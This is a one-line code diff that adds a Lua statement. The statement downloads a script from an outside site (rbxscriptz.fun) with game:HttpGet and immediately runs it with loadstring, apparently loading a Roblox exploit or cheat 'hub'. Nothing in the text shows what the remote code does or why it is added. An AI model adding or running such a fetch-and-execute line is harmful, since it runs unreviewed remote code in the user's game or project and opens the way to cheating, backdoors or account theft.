@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://rbxscriptz.fun/RBXZ-HUB"))()
